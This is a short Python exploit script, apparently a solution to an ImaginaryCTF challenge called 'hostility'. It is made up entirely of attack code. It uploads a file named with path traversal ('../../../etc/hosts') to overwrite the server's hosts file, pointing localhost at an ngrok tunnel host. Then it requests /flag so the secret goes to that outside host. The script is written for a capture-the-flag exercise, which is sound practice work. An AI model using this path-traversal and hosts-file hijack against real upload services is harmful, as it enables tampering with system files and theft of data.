import requests

URL="https://hostility.chal.imaginaryctf.org"
files = {
    "file": ("../../../etc/hosts", """9ee7-126-149-77-239.jp.ngrok.io   localhost""" )
}
res = requests.post(URL+"/upload", files=files)
print(res.text)
res = requests.get(URL+"/flag")
print(res.text)